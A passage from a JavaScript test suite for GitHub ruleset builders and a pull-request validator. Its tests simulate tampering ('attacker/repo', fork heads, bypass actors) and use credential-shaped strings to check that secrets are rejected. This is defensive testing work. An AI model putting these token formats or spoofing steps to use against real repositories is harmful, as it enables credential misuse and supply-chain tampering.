    validatePullRequestSnapshot(snapshotFor([{ path: "README.md", content: hashes }])),
    { ok: true, errors: [] },
  );
});

test("builds an exact workflow-identity ruleset that a same-repo status cannot spoof", async () => {
  const module = await import("../scripts/build-bury-p1-required-workflow-ruleset.mjs").catch(() => ({}));
  assert.equal(typeof module.buildRequiredWorkflowRuleset, "function");
  const payload = module.buildRequiredWorkflowRuleset({
    repositoryId: 123456789,
    workflowSha: "a".repeat(40),
    existingRuleset: {
      name: "protect main",
      target: "branch",
      enforcement: "active",
      bypass_actors: [],
      conditions: { ref_name: { include: ["refs/heads/main"], exclude: [] } },
      rules: [
        { type: "deletion" },
        {
          type: "required_status_checks",
          parameters: {
            required_status_checks: [
              { context: "bury-p1/trusted-pr-validation", integration_id: 15368 },
            ],
            strict_required_status_checks_policy: true,
          },
        },
      ],
    },
  });
  const workflowRule = payload.rules.find((rule) => rule.type === "workflows");
  assert.deepEqual(workflowRule, {
    type: "workflows",
    parameters: {
      do_not_enforce_on_create: false,
      workflows: [
        {
          path: ".github/workflows/bury-p1-trusted-pr-validation.yml",
          ref: "refs/heads/main",
          repository_id: 123456789,
          sha: "a".repeat(40),
        },
      ],
    },
  });
  assert.equal(
    payload.rules.some((rule) =>
      JSON.stringify(rule).includes("bury-p1/trusted-pr-validation"),
    ),
    false,
  );
  assert.deepEqual(payload.bypass_actors, []);
  assert.throws(
    () => module.buildRequiredWorkflowRuleset({ repositoryId: 1, workflowSha: "main", existingRuleset: {} }),
    /SHA|ruleset/i,
  );
  assert.throws(
    () => module.buildRequiredWorkflowRuleset({
      repositoryId: 123456789,
      workflowSha: "a".repeat(40),
      existingRuleset: {
        name: "unsafe bypass",
        target: "branch",
        enforcement: "active",
        bypass_actors: [{ actor_id: 5, actor_type: "User", bypass_mode: "always" }],
        conditions: { ref_name: { include: ["refs/heads/main"], exclude: [] } },
        rules: [],
      },
    }),
    /bypass/i,
  );

  const withExistingWorkflow = module.buildRequiredWorkflowRuleset({
    repositoryId: 123456789,
    workflowSha: "a".repeat(40),
    existingRuleset: {
      name: "protect main",
      target: "branch",
      enforcement: "active",
      bypass_actors: [],
      conditions: { ref_name: { include: ["refs/heads/main"], exclude: [] } },
      rules: [{
        type: "workflows",
        parameters: {
          do_not_enforce_on_create: false,
          workflows: [{ path: ".github/workflows/other.yml", repository_id: 99, sha: "b".repeat(40) }],
        },
      }],
    },
  });
  assert.equal(
    withExistingWorkflow.rules.find((rule) => rule.type === "workflows").parameters.workflows.length,
    2,
  );

  const twoPhase = module.buildRequiredWorkflowRuleset({
    repositoryId: 123456789,
    workflowSha: "c".repeat(40),
    previousWorkflowSha: "a".repeat(40),
    existingRuleset: {
      name: "protect main", target: "branch", enforcement: "active", bypass_actors: [],
      conditions: { ref_name: { include: ["refs/heads/main"], exclude: [] } }, rules: [],
    },
  });
  assert.deepEqual(
    twoPhase.rules.find((rule) => rule.type === "workflows").parameters.workflows.map((workflow) => workflow.sha),
    ["a".repeat(40), "c".repeat(40)],
  );
  const tagRuleset = module.buildImmutableConsumptionTagRuleset();
  assert.equal(tagRuleset.target, "tag");
  assert.deepEqual(tagRuleset.bypass_actors, []);
  assert.deepEqual(tagRuleset.rules.map((rule) => rule.type).sort(), ["deletion", "update"]);
  const creationRuleset = module.buildRestrictedConsumptionTagCreationRuleset();
  assert.equal(creationRuleset.rules[0].type, "creation");
  assert.deepEqual(creationRuleset.bypass_actors, [{ actor_id: 15368, actor_type: "Integration", bypass_mode: "always" }]);
});

test("verifies exact protected-main workflow provenance after ruleset activation", async () => {
  const module = await import("../scripts/verify-bury-p1-required-workflow-ruleset.mjs").catch(() => ({}));
  assert.equal(typeof module.verifyRequiredWorkflowRuleset, "function");
  const expectedSha = "a".repeat(40);
  const input = {
    repositoryId: 123456789,
    workflowSha: expectedSha,
    repositoryReadback: { id: 123456789, full_name: repository, default_branch: "main" },
    branchReadback: { name: "main", commit: { sha: expectedSha }, protected: true },
    commitReadback: { sha: expectedSha, commit: { tree: { sha: "d".repeat(40) } } },
    workflowTreeReadback: { sha: "d".repeat(40), truncated: false, tree: [
      { path: ".github/workflows/bury-p1-trusted-pr-validation.yml", mode: "100644", type: "blob", sha: "b".repeat(40) },
      { path: ".github/workflows/bury-p1-activation-probe.yml", mode: "100644", type: "blob", sha: "e".repeat(40) },
      { path: "scripts/run-bury-p1-activation-probe.mjs", mode: "100644", type: "blob", sha: "f".repeat(40) },
    ] },
    workflowContentReadback: { path: ".github/workflows/bury-p1-trusted-pr-validation.yml", sha: "b".repeat(40), type: "file" },
    activationWorkflowContentReadback: { path: ".github/workflows/bury-p1-activation-probe.yml", sha: "e".repeat(40), type: "file" },
    activationScriptContentReadback: { path: "scripts/run-bury-p1-activation-probe.mjs", sha: "f".repeat(40), type: "file" },
    rulesetReadback: {
      source_type: "Repository", source: repository, target: "branch", enforcement: "active", bypass_actors: [],
      conditions: { ref_name: { include: ["refs/heads/main"], exclude: [] } },
      rules: [{ type: "workflows", parameters: { do_not_enforce_on_create: false, workflows: [{
        path: ".github/workflows/bury-p1-trusted-pr-validation.yml", ref: "refs/heads/main", repository_id: 123456789, sha: expectedSha,
      }] } }],
    },
  };
  assert.equal(module.verifyRequiredWorkflowRuleset(input).ok, true);
  assert.equal(module.verifyImmutableConsumptionTagRuleset((await import("../scripts/build-bury-p1-required-workflow-ruleset.mjs")).buildImmutableConsumptionTagRuleset()).ok, true);
  assert.equal(module.verifyRestrictedConsumptionTagCreationRuleset((await import("../scripts/build-bury-p1-required-workflow-ruleset.mjs")).buildRestrictedConsumptionTagCreationRuleset()).ok, true);
  const builders = await import("../scripts/build-bury-p1-required-workflow-ruleset.mjs");
  const creationRulesetId = 7001;
  const immutabilityRulesetId = 7002;
  const ruleSuite = ({ id, ref, actor_id, result, rulesetId, rule_type }) => ({
    id, actor_id, actor_name: actor_id === 15368 ? "github-actions" : "ordinary-writer",
    before_sha: "1".repeat(40), after_sha: "2".repeat(40), ref,
    repository_id: 123456789, repository_name: "singingattitude-release-attestations",
    pushed_at: "2026-08-14T12:00:00Z", result, evaluation_result: "fail",
    rule_evaluations: [{ rule_source: { type: "ruleset", id: rulesetId, name: "exact" }, enforcement: "active", result: "fail", rule_type }],
  });
  const activation = {
    repositoryId: 123456789, creationRulesetId, immutabilityRulesetId,
    creationRulesetReadback: { ...builders.buildRestrictedConsumptionTagCreationRuleset(), id: creationRulesetId, source_type: "Repository", source: repository },
    immutabilityRulesetReadback: { ...builders.buildImmutableConsumptionTagRuleset(), id: immutabilityRulesetId, source_type: "Repository", source: repository },
    actionsCreationRuleSuite: ruleSuite({ id: 8001, ref: "refs/tags/bury-p1-consumed/ACTIVATION-PROBE-ACTIONS", actor_id: 15368, result: "bypass", rulesetId: creationRulesetId, rule_type: "creation" }),
    ordinaryCreationRuleSuite: ruleSuite({ id: 8002, ref: "refs/tags/bury-p1-consumed/ACTIVATION-PROBE-WRITER", actor_id: 999, result: "fail", rulesetId: creationRulesetId, rule_type: "creation" }),
    updateRuleSuite: ruleSuite({ id: 8003, ref: "refs/tags/bury-p1-consumed/ACTIVATION-PROBE-ACTIONS", actor_id: 15368, result: "fail", rulesetId: immutabilityRulesetId, rule_type: "update" }),
    deletionRuleSuite: ruleSuite({ id: 8004, ref: "refs/tags/bury-p1-consumed/ACTIVATION-PROBE-ACTIONS", actor_id: 15368, result: "fail", rulesetId: immutabilityRulesetId, rule_type: "deletion" }),
  };
  assert.equal(module.verifyTagRulesetActivation(activation).ok, true);
  for (const mutate of [
    (value) => { value.creationRulesetReadback.source_type = "Organization"; },
    (value) => { value.immutabilityRulesetReadback.id = 9; },
    (value) => { value.actionsCreationRuleSuite.actor_id = 999; },
    (value) => { value.ordinaryCreationRuleSuite.result = "pass"; },
    (value) => { value.updateRuleSuite.rule_evaluations[0].rule_source.id = creationRulesetId; },
    (value) => { value.deletionRuleSuite.result = "bypass"; },
  ]) {
    const attacked = structuredClone(activation);
    mutate(attacked);
    assert.throws(() => module.verifyTagRulesetActivation(attacked), /ruleset|rule-suite|actor|outcome|provenance/i);
  }
  for (const mutate of [
    (value) => { value.repositoryReadback.id = 9; },
    (value) => { value.branchReadback.commit.sha = "c".repeat(40); },
    (value) => { value.activationWorkflowContentReadback.sha = "0".repeat(40); },
    (value) => { value.activationScriptContentReadback.path = "scripts/attacker.mjs"; },
    (value) => { value.rulesetReadback.rules[0].parameters.workflows[0].ref = "refs/heads/dev"; },
    (value) => { value.rulesetReadback.bypass_actors = [{ actor_type: "User", actor_id: 1 }]; },
  ]) {
    const attacked = structuredClone(input);
    mutate(attacked);
    assert.throws(() => module.verifyRequiredWorkflowRuleset(attacked), /repository|main|ref|bypass|provenance/i);
  }

  const dual = structuredClone(input);
  dual.rulesetReadback.rules[0].parameters.workflows.unshift({
    path: ".github/workflows/bury-p1-trusted-pr-validation.yml", ref: "refs/heads/main", repository_id: 123456789, sha: "c".repeat(40),
  });
  assert.equal(module.verifyRequiredWorkflowRuleset({ ...dual, transitionState: "dual", previousWorkflowSha: "c".repeat(40) }).ok, true);
  assert.throws(() => module.verifyRequiredWorkflowRuleset({ ...input, transitionState: "dual", previousWorkflowSha: "c".repeat(40) }), /previous|dual|transition/i);
  assert.equal(module.verifyRequiredWorkflowRuleset({ ...input, transitionState: "final", previousWorkflowSha: "c".repeat(40) }).ok, true);
  assert.throws(() => module.verifyRequiredWorkflowRuleset({ ...dual, transitionState: "final", previousWorkflowSha: "c".repeat(40) }), /previous|final|transition/i);
});

test("rejects a PR that tries to weaken or delete any trusted baseline file", () => {
  for (const protectedPath of trustedPolicy.protectedPaths) {
    const result = validatePullRequestSnapshot(
      snapshotFor([
        {
          path: protectedPath,
          content: "export const allowEverything = true;\n",
          status: protectedPath.includes("policy/") ? "removed" : "modified",
        },
      ]),
    );

    assert.equal(result.ok, false, protectedPath);
    assert.match(result.errors.join("\n"), /trusted baseline/i, protectedPath);
  }
});

test("rejects forks, repository mismatches, and non-main bases", () => {
  const cases = [
    ["event repository mismatch", (value) => (value.event.repository.full_name = "attacker/repo")],
    ["base repository mismatch", (value) => (value.event.pull_request.base.repo.full_name = "attacker/repo")],
    ["fork head", (value) => (value.event.pull_request.head.repo.full_name = "attacker/repo")],
    ["non-main base", (value) => (value.event.pull_request.base.ref = "release")],
  ];

  for (const [name, mutate] of cases) {
    const value = snapshotFor([{ path: "README.md", content: "Safe public text\n" }]);
    mutate(value);
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, name);
    assert.match(result.errors.join("\n"), /repository|fork|main/i, name);
  }
});

test("rejects incomplete or inconsistent GitHub API snapshots", () => {
  const cases = [
    ["truncated tree", (value) => (value.tree.truncated = true)],
    ["missing compare file", (value) => (value.event.pull_request.changed_files = 2)],
    ["wrong head commit", (value) => (value.headCommit.sha = "8".repeat(40))],
    ["missing tree entry", (value) => (value.tree.tree = [])],
    ["missing blob", (value) => (value.blobs = {})],
  ];

  for (const [name, mutate] of cases) {
    const value = snapshotFor([{ path: "README.md", content: "Safe public text\n" }]);
    mutate(value);
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, name);
    assert.match(result.errors.join("\n"), /truncated|count|head|tree|blob/i, name);
  }
});

test("rejects unknown paths, removals, renames, symlinks, and submodules", () => {
  const cases = [
    ["unknown path", { path: "scripts/run-pr-code.sh" }],
    ["removal", { path: "README.md", status: "removed" }],
    ["rename", { path: "README.md", status: "renamed" }],
    ["symlink", { path: "README.md", mode: "120000" }],
    ["submodule", { path: "README.md", mode: "160000", type: "commit" }],
  ];

  for (const [name, file] of cases) {
    const result = validatePullRequestSnapshot(snapshotFor([file]));
    assert.equal(result.ok, false, name);
    assert.match(result.errors.join("\n"), /path|removed|renamed|mode|type|symlink|submodule/i, name);
  }
});

test("rejects excessive file counts and byte sizes", () => {
  const tooMany = Array.from({ length: trustedPolicy.maxChangedFiles + 1 }, (_, index) => ({
    path: `schemas/bury-p1-test-${index}-v1.schema.json`,
  }));
  const tooLarge = snapshotFor([
    {
      path: "README.md",
      content: "x".repeat(trustedPolicy.maxFileBytes + 1),
    },
  ]);
  const totalTooLarge = snapshotFor([
    { path: "README.md", content: "x".repeat(40_000) },
    { path: "SECURITY.md", content: "x".repeat(40_000) },
  ]);
  totalTooLarge.policy = { ...trustedPolicy, maxTotalBytes: 70_000 };

  for (const [name, value] of [
    ["file count", snapshotFor(tooMany)],
    ["file size", tooLarge],
    ["total size", totalTooLarge],
  ]) {
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, name);
    assert.match(result.errors.join("\n"), /count|size|bytes/i, name);
  }
});

test("rejects binary and malformed UTF-8 blobs", () => {
  const cases = [
    Buffer.from([0x7b, 0x00, 0x7d]),
    Buffer.from([0x7b, 0x01, 0x7d]),
    Buffer.from([0xc3, 0x28]),
  ];

  for (const bytes of cases) {
    const value = snapshotFor([{ path: "README.md", content: "placeholder" }]);
    const sha = value.compare.files[0].sha;
    value.tree.tree[0].size = bytes.length;
    value.blobs[sha] = {
      encoding: "base64",
      content: bytes.toString("base64"),
      size: bytes.length,
    };
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false);
    assert.match(result.errors.join("\n"), /binary|utf-8/i);
  }
});

test("rejects workflow actions that are not pinned to full commit SHAs", () => {
  for (const [reference, key] of [
    ["actions/checkout@v4", "uses"],
    ["./local-action", "uses"],
    ["docker://alpine:latest", "uses"],
    ["actions/checkout@v4", '"uses"'],
    ["actions/checkout@v4", "'uses'"],
  ]) {
    const result = validatePullRequestSnapshot(
      snapshotFor([
        {
          path: ".github/workflows/bury-p1-native-attestation.yml",
          content: `name: Unsafe\nsteps:\n  - ${key}: ${reference}\n`,
        },
      ]),
    );
    assert.equal(result.ok, false, reference);
    assert.match(result.errors.join("\n"), /pinned|action/i, reference);
  }
});

test("rejects secrets and public PII patterns in otherwise allowed files", () => {
  const cases = [
    `contact alex${String.fromCharCode(64)}example.com`,
    `user ${["123e4567", "e89b", "12d3", "a456", "426614174000"].join("-")}`,
    `token ${"ghp_"}${"a".repeat(36)}`,
    `stripe ${"sk_live_"}${"a".repeat(24)}`,
    ["-----BEGIN", "PRIVATE KEY-----"].join(" "),
    `${"postgresql"}://${"user:password"}${String.fromCharCode(64)}example.invalid/db`,
    `${"AKIA"}${"A".repeat(16)}`,
    `${"xoxb-"}${"1".repeat(24)}`,
    `Authorization: ${"Bearer"} ${"a".repeat(32)}`,
  ];

  for (const content of cases) {
    const result = validatePullRequestSnapshot(
      snapshotFor([{ path: "README.md", content }]),
    );
    assert.equal(result.ok, false, content);
    assert.match(result.errors.join("\n"), /secret|sensitive|PII/i, content);
  }
});
